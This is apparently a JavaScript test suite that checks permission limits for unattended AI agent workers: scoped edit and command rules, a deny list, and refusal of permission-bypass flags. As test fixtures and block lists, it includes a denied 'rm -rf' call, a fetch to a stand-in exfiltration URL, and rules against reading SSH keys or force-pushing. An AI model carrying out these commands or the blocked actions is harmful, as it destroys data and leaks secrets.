// Tests for worker-capabilities.mjs — the derived argv of every worker kind,
// the project deny list in .claude/settings.json, and the guarantee that no
// spawn anywhere skips permissions.

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { execFileSync } from 'node:child_process'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import {
  WORKER_CAPABILITIES,
  WORKER_KINDS,
  WORKER_FLAG,
  FORBIDDEN_FLAGS,
  PROJECT_DENY,
  workerTools,
  allowedRules,
  disallowedRules,
  workerPermissionArgs,
  expandWorkerArgs,
  personalVariants,
  deniedTools,
  bashRule,
  permissionMode,
} from './worker-capabilities.mjs'

// Every kind but chat runs unattended; chat is the one attended kind.
const UNATTENDED = WORKER_KINDS.filter((k) => !WORKER_CAPABILITIES[k].attended)

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')

/** The values following `flag` up to the next `--option`. */
function flagValues(argv, flag) {
  const i = argv.indexOf(flag)
  if (i === -1) return null
  const out = []
  for (let j = i + 1; j < argv.length && !argv[j].startsWith('--'); j++) out.push(argv[j])
  return out
}

const editRules = (kind) => allowedRules(kind).filter((r) => r.startsWith('Edit('))
const bashRules = (kind) => allowedRules(kind).filter((r) => r.startsWith('Bash('))

// ─── Every kind ──────────────────────────────────────────────────────────────

test('every kind derives its mode, no MCP, project settings only, and both rule lists', () => {
  assert.deepEqual(WORKER_KINDS.filter((k) => WORKER_CAPABILITIES[k].attended), ['chat'])
  for (const kind of WORKER_KINDS) {
    const argv = workerPermissionArgs(kind)
    assert.deepEqual(flagValues(argv, '--permission-mode'), [kind === 'chat' ? 'acceptEdits' : 'dontAsk'], kind)
    assert.equal(permissionMode(kind), kind === 'chat' ? 'acceptEdits' : 'dontAsk')
    assert.ok(argv.includes('--strict-mcp-config'), kind)
    assert.deepEqual(flagValues(argv, '--setting-sources'), ['project'], kind)
    assert.deepEqual(flagValues(argv, '--tools'), [workerTools(kind).join(',')], kind)
    assert.deepEqual(flagValues(argv, '--allowedTools'), allowedRules(kind), kind)
    assert.deepEqual(flagValues(argv, '--disallowedTools'), disallowedRules(kind), kind)
    assert.ok(!argv.some((a) => a.includes('skip-permissions')), kind)
    assert.ok(!argv.includes('bypassPermissions'), kind)
  }
})

test('no unattended kind gets an unscoped write, unscoped Bash, MCP or subagent tool', () => {
  for (const kind of UNATTENDED) {
    const allowed = allowedRules(kind)
    for (const bare of ['Edit', 'Write', 'Bash', 'NotebookEdit', 'Agent', 'Task']) {
      assert.ok(!allowed.includes(bare), `${kind} allows bare ${bare}`)
    }
    assert.ok(!allowed.some((r) => r.startsWith('mcp__')), kind)
    for (const r of [...editRules(kind), ...bashRules(kind)]) {
      assert.ok(!/\((\*|\*\*|\.\/\*\*|\/\/\*\*)\)$/.test(r), `${kind}: ${r} is unscoped`)
      assert.ok(!r.startsWith('Bash(:'), `${kind}: empty Bash prefix`)
    }
    assert.ok(!workerTools(kind).some((t) => ['Agent', 'Task', 'NotebookEdit'].includes(t)), kind)
  }
})

test('every kind denies the project deny list first', () => {
  for (const kind of WORKER_KINDS) {
    assert.deepEqual(disallowedRules(kind).slice(0, PROJECT_DENY.length), PROJECT_DENY, kind)
  }
})

test('Bash counts as a write tool: an unattended kind has Bash only through named commands', () => {
  for (const kind of UNATTENDED) {
    const hasBash = workerTools(kind).includes('Bash')
    assert.equal(hasBash, WORKER_CAPABILITIES[kind].commands.length > 0, kind)
    for (const r of bashRules(kind)) {
      // A command prefix (`node scripts/x.mjs:*`), an exact command, or the one
      // cp pattern; never a bare interpreter or shell.
      assert.ok(!/^Bash\((node|npm|npx|bash|sh|zsh|python3?|cp|mv|rm|curl|wget|git)(:\*)?\)$/.test(r), `${kind}: ${r}`)
    }
  }
})

test('user/ and the trackers are never writable by a worker that reads postings', () => {
  for (const kind of ['eval', 'eval-app', 'scan', 'apply-flow']) {
    const allowed = editRules(kind)
    assert.ok(!allowed.some((r) => /\.\/(private\/\*\*\/)?user\/(\*\*|cv\.md|profile\.yml|_profile\.md)\)/.test(r)), kind)
    assert.ok(!allowed.some((r) => r.includes('data/scouting.md')), kind)
  }
  for (const kind of ['eval', 'eval-app']) {
    assert.ok(disallowedRules(kind).includes('Edit(./user/**)'), kind)
    assert.ok(disallowedRules(kind).includes('Edit(./private/**/user/**)'), kind)
    assert.ok(disallowedRules(kind).includes('Edit(./data/applications.md)'), kind)
  }
})

// ─── Per kind ────────────────────────────────────────────────────────────────

test('eval workers write only under batch/ and reports/, plus their data rows and caches', () => {
  const dataRows = ['score-history.tsv', 'report-summaries.tsv', 'comp-cache.tsv', 'tax-cache.tsv', 'col-cache.tsv']
  for (const kind of ['eval', 'eval-app']) {
    for (const p of WORKER_CAPABILITIES[kind].writes) {
      const ok = p.startsWith('batch/') || p.startsWith('reports/tier-') || p === 'jds/**' ||
        dataRows.some((f) => p === `data/${f}`) || (kind === 'eval-app' && p === 'data/pipeline.md')
      assert.ok(ok, `${kind} writes ${p}`)
    }
    assert.deepEqual(WORKER_CAPABILITIES[kind].tmp, [], kind)
    assert.deepEqual(workerTools(kind), ['Read', 'Glob', 'Grep', 'Edit', 'Write', 'Bash', 'WebFetch', 'WebSearch'])
  }
})

test('the batch eval worker argv, exactly', () => {
  assert.deepEqual(workerPermissionArgs('eval'), [
    '--permission-mode', 'dontAsk',
    '--strict-mcp-config',
    '--setting-sources', 'project',
    '--tools', 'Read,Glob,Grep,Edit,Write,Bash,WebFetch,WebSearch',
    '--allowedTools',
    'Read(./**)', 'Glob', 'Grep',
    'Edit(./reports/tier-1/**)', 'Edit(./private/**/reports/tier-1/**)',
    'Edit(./reports/tier-2/**)', 'Edit(./private/**/reports/tier-2/**)',
    'Edit(./reports/tier-3/**)', 'Edit(./private/**/reports/tier-3/**)',
    'Edit(./batch/scouting-additions/**)', 'Edit(./private/**/batch/scouting-additions/**)',
    'Edit(./batch/work/**)',
    'Edit(./jds/**)', 'Edit(./private/**/jds/**)',
    'Edit(./data/score-history.tsv)', 'Edit(./private/**/data/score-history.tsv)',
    'Edit(./data/report-summaries.tsv)', 'Edit(./private/**/data/report-summaries.tsv)',
    'Edit(./data/comp-cache.tsv)', 'Edit(./private/**/data/comp-cache.tsv)',
    'Edit(./data/tax-cache.tsv)', 'Edit(./private/**/data/tax-cache.tsv)',
    'Edit(./data/col-cache.tsv)', 'Edit(./private/**/data/col-cache.tsv)',
    'Bash(node scripts/posting-guard.mjs:*)',
    'Bash(node scripts/fetch-posting.mjs:*)',
    'Bash(node scripts/score-listing.mjs:*)',
    'Bash(node scripts/append-score-rows.mjs:*)',
    'Bash(node scripts/reserve-report-num.mjs:*)',
    'Bash(node scripts/cv-summary.mjs:*)',
    'Bash(node scripts/agent-log.mjs log:*)',
    'Bash(node scripts/outcomes.mjs --json)',
    'Bash(node scripts/messages.mjs post --source eval:*)',
    'Bash(cd .)',
    'WebFetch', 'WebSearch',
    '--disallowedTools',
    ...PROJECT_DENY,
    'Edit(./user/**)', 'Edit(./private/**/user/**)',
    'Edit(./data/applications.md)', 'Edit(./private/**/data/applications.md)',
    'Edit(./data/scouting.md)', 'Edit(./private/**/data/scouting.md)',
  ])
})

test('the app eval worker adds the pipeline inbox and its merge, nothing broader', () => {
  const extraWrites = editRules('eval-app').filter((r) => !editRules('eval').includes(r))
  assert.deepEqual(extraWrites, ['Edit(./data/pipeline.md)', 'Edit(./private/**/data/pipeline.md)'])
  assert.ok(bashRules('eval-app').includes('Bash(node scripts/merge-scouting.mjs:*)'))
})

test('chat is attended: it edits the checkout and runs starpath scripts, but never pushes, backs up or edits the tracker', () => {
  const allowed = allowedRules('chat')
  assert.ok(allowed.includes('Edit(./**)'))
  for (const r of ['Bash(node scripts/*)', 'Bash(npm run *)', 'Bash(git status:*)', 'Bash(git diff:*)', 'Bash(git log:*)', 'WebFetch', 'WebSearch']) {
    assert.ok(allowed.includes(r), r)
  }
  assert.ok(!allowed.some((r) => /^Bash\((git (push|commit|reset)|rm|curl)/.test(r)))
  const denied = disallowedRules('chat')
  for (const r of ['Edit(./.claude/**)', 'Edit(./data/applications.md)', 'Edit(./private/**/data/applications.md)',
    'Bash(git push*)', 'Bash(git reset*)', 'Bash(npm run backup*)', 'Bash(node scripts/private.mjs*)',
    'Bash(npm run schedule*)', 'Bash(node scripts/*..*)']) {
    assert.ok(denied.includes(r), r)
  }
  assert.ok(!allowed.includes('Bash') && !allowed.includes('Edit'), 'no bare tools even when attended')
})

test('apply flows run the CV tools and write under private/CV/applications and output/', () => {
  const bash = bashRules('apply-flow')
  for (const c of ['private/CV/bin/new-cv', 'private/CV/bin/build-cv', 'pdftotext', 'node scripts/ats-coverage.mjs']) {
    assert.ok(bash.includes(`Bash(${c}:*)`), c)
  }
  assert.ok(bash.includes('Bash(cp private/CV/applications/*.pdf output/*.pdf)'))
  const edits = editRules('apply-flow')
  assert.ok(edits.includes('Edit(./private/CV/applications/**)'))
  assert.ok(edits.includes('Edit(./output/**)') && edits.includes('Edit(./private/**/output/**)'))
  assert.ok(disallowedRules('apply-flow').includes('Edit(./user/**)'))
})

test('temp-dir scratch is granted only to kinds that list it, as absolute rules for each spelling', () => {
  const tmpdirs = ['/var/folders/ab/T', '/private/var/folders/ab/T/', '/tmp', 'relative/ignored']
  const rules = allowedRules('apply-flow', { tmpdirs })
  assert.ok(rules.includes('Edit(//var/folders/ab/T/jd-*.txt)'))
  assert.ok(rules.includes('Edit(//private/var/folders/ab/T/cv-*.txt)'))
  assert.ok(rules.includes('Edit(//tmp/cv-*.html)'))
  assert.ok(!rules.some((r) => r.includes('relative/ignored')))
  assert.deepEqual(allowedRules('eval', { tmpdirs }), allowedRules('eval'))
  assert.ok(!allowedRules('apply-flow').some((r) => r.startsWith('Edit(//')), 'no tmpdirs → no scratch rules')
})

test('cd is allowed only to the working directory itself, as exact rules', () => {
  const rules = allowedRules('eval', { cwds: ['/repo', '/private/repo', 'rel'] })
  assert.deepEqual(rules.filter((r) => r.startsWith('Bash(cd')), ['Bash(cd .)', 'Bash(cd /repo)', 'Bash(cd /private/repo)'])
  assert.ok(!rules.some((r) => /^Bash\(cd[ :]?\*?\)$/.test(r) || r.startsWith('Bash(cd:')))
  // A kind whose only command is the Messages post gets that and the cd rules, nothing else.
  assert.deepEqual(allowedRules('cv-import', { cwds: ['/repo'] }).filter((r) => r.startsWith('Bash(')),
    ['Bash(node scripts/messages.mjs post --source worker:*)', 'Bash(cd .)', 'Bash(cd /repo)'])
})

test('linked paths get the resolved private/ spelling; private/ paths and plain ones do not', () => {
  assert.deepEqual(personalVariants('data/x.tsv'), ['./data/x.tsv', './private/**/data/x.tsv'])
  assert.deepEqual(personalVariants('./reports/tier-1/**'), ['./reports/tier-1/**', './private/**/reports/tier-1/**'])
  assert.deepEqual(personalVariants('batch/scouting-additions/**'), ['./batch/scouting-additions/**', './private/**/batch/scouting-additions/**'])
  assert.deepEqual(personalVariants('private/CV/applications/**'), ['./private/CV/applications/**'])
  assert.deepEqual(personalVariants('datasets/x'), ['./datasets/x'])
})

test('bashRule renders prefixes, exact commands and patterns', () => {
  assert.equal(bashRule('node scripts/x.mjs'), 'Bash(node scripts/x.mjs:*)')
  assert.equal(bashRule({ exact: 'node scripts/x.mjs --json' }), 'Bash(node scripts/x.mjs --json)')
  assert.equal(bashRule({ pattern: 'cp a/*.pdf b/*.pdf' }), 'Bash(cp a/*.pdf b/*.pdf)')
})

// ─── Marker expansion (what main does to a renderer argv) ────────────────────

test('expandWorkerArgs swaps the marker for the kind flags and keeps the rest in order', () => {
  const argv = expandWorkerArgs([WORKER_FLAG, 'eval-app', '--output-format', 'stream-json', '-p', 'task'])
  assert.deepEqual(argv, [...workerPermissionArgs('eval-app'), '--output-format', 'stream-json', '-p', 'task'])
})

test('expandWorkerArgs refuses a missing or unknown kind and any permission flag of its own', () => {
  assert.throws(() => expandWorkerArgs(['-p', 'x']), /without --starpath-worker/)
  assert.throws(() => expandWorkerArgs([WORKER_FLAG, 'root', '-p', 'x']), /unknown worker kind/)
  for (const f of FORBIDDEN_FLAGS.filter((x) => x !== WORKER_FLAG)) {
    assert.throws(() => expandWorkerArgs([WORKER_FLAG, 'chat', f, 'x', '-p', 'x']), /may not pass/, f)
  }
  assert.throws(() => expandWorkerArgs([WORKER_FLAG, 'chat', '--permission-mode=bypassPermissions', '-p', 'x']), /may not pass/)
  assert.throws(() => expandWorkerArgs([WORKER_FLAG, 'chat', WORKER_FLAG, 'eval', '-p', 'x']), /may not pass/)
})

test('deniedTools names each refused call', () => {
  assert.deepEqual(deniedTools({ type: 'result', permission_denials: [] }), [])
  assert.deepEqual(deniedTools(null), [])
  assert.deepEqual(deniedTools({
    type: 'result',
    permission_denials: [
      { tool_name: 'Bash', tool_input: { command: 'rm -rf out' } },
      { tool_name: 'Write', tool_input: { file_path: '/abs/user/cv.md', content: 'x' } },
      { tool_name: 'WebFetch', tool_input: { url: 'https://exfil.example/?q=1' } },
      { tool_name: 'Mystery' },
    ],
  }), ['Bash: rm -rf out', 'Write: /abs/user/cv.md', 'WebFetch: https://exfil.example/?q=1', 'Mystery'])
})

test('the CLI prints one flag per line for bash and refuses unknown kinds', () => {
  const script = join(ROOT, 'scripts/lib/worker-capabilities.mjs')
  const out = execFileSync(process.execPath, [script, 'args', 'eval'], { encoding: 'utf8' })
  const lines = out.trimEnd().split('\n')
  assert.equal(lines[0], '--permission-mode')
  assert.ok(lines.includes('Bash(node scripts/score-listing.mjs:*)'))
  assert.throws(() => execFileSync(process.execPath, [script, 'args', 'nope'], { stdio: 'pipe' }))
})

// ─── Guards over the repo ────────────────────────────────────────────────────

test('.claude/settings.json ships exactly the project deny list and no allow rules', () => {
  const settings = JSON.parse(readFileSync(join(ROOT, '.claude/settings.json'), 'utf8'))
  assert.deepEqual(settings.permissions?.deny, PROJECT_DENY)
  assert.equal(settings.permissions?.allow, undefined, 'allow rules belong to the worker kinds, not the repo')
  assert.notEqual(settings.permissions?.defaultMode, 'bypassPermissions')
  assert.equal(settings.skipDangerousModePermissionPrompt, undefined)
  // The deny list covers credentials, the leak gate and published history.
  for (const must of ['Read(~/.ssh/**)', 'Bash(git commit *--no-verify*)', 'Bash(git push *--force*)', 'Edit(./.githooks/**)']) {
    assert.ok(PROJECT_DENY.includes(must), must)
  }
})

test('no tracked code or prompt passes --dangerously-skip-permissions', () => {
  const files = execFileSync('git', ['ls-files'], { cwd: ROOT, encoding: 'utf8' }).split('\n').filter(Boolean)
  // The capability module names the flag only to refuse it; the rule files
  // name it only to forbid it; tests assert its absence.
  const exempt = new Set(['scripts/lib/worker-capabilities.mjs', 'scripts/lib/worker-capabilities.test.mjs', 'CLAUDE.md', 'AGENTS.md'])
  const offenders = []
  for (const f of files) {
    if (exempt.has(f) || !/\.(m?js|ts|tsx|sh|md|json|ya?ml)$/.test(f) || f.startsWith('docs/')) continue
    if (f.endsWith('.test.ts') || f.endsWith('.test.mjs')) continue
    let text
    try { text = readFileSync(join(ROOT, f), 'utf8') } catch { continue }
    if (text.includes('--dangerously-skip-permissions') || text.includes('--allow-dangerously-skip-permissions')) offenders.push(f)
  }
  assert.deepEqual(offenders, [])
})

test('the frontend lists exactly the table kinds', () => {
  const src = readFileSync(join(ROOT, 'frontend/src/lib/spawnFormat.ts'), 'utf8')
  const m = src.match(/export const WORKER_KINDS = \[([\s\S]*?)\] as const/)
  assert.ok(m, 'spawnFormat.ts declares WORKER_KINDS')
  const kinds = [...m[1].matchAll(/'([a-z-]+)'/g)].map((x) => x[1])
  assert.deepEqual([...kinds].sort(), [...WORKER_KINDS].sort())
  assert.ok(src.includes(`export const WORKER_FLAG = '${WORKER_FLAG}'`))
})

// ─── Instructions vs permissions ────────────────────────────────────────────
// A worker whose instructions name a script it may not run gets denied
// mid-run (a Full scan once lost its whole web-search pass that way). Every
// `node scripts/*.mjs` a kind's mode files tell it to run must be allowed.
const KIND_INSTRUCTIONS = {
  eval: ['batch/batch-prompt.md'],
  'eval-app': ['batch/batch-prompt.md', 'modes/scouting.md', 'modes/pipeline.md'],
  scan: ['modes/scan.md'],
  'apply-flow': ['modes/pdf.md', 'modes/apply.md', 'modes/interview-prep.md'],
  positioning: ['modes/positioning.md'],
}

test("every script a worker's instructions name is one it may run", () => {
  const here = dirname(fileURLToPath(import.meta.url))
  const root = join(here, '..', '..')
  for (const [kind, files] of Object.entries(KIND_INSTRUCTIONS)) {
    const rules = allowedRules(kind).filter((r) => r.startsWith('Bash('))
    const named = new Set()
    for (const f of files) {
      for (const m of readFileSync(join(root, f), 'utf-8').matchAll(/node (scripts\/[\w/-]+\.mjs)/g)) named.add(`node ${m[1]}`)
    }
    const missing = [...named].filter((c) => !rules.some((r) => r.startsWith(`Bash(${c}`)))
    assert.deepEqual(missing, [], `${kind}: its instructions run ${missing.join(', ')} but its permissions don't allow it`)
  }
})

test('every unattended worker can post to Messages, under its own source', () => {
  for (const kind of UNATTENDED) {
    const posts = allowedRules(kind).filter((r) => r.startsWith('Bash(node scripts/messages.mjs post --source '))
    assert.equal(posts.length, 1, `${kind} has no way to reach the user`)
  }
})
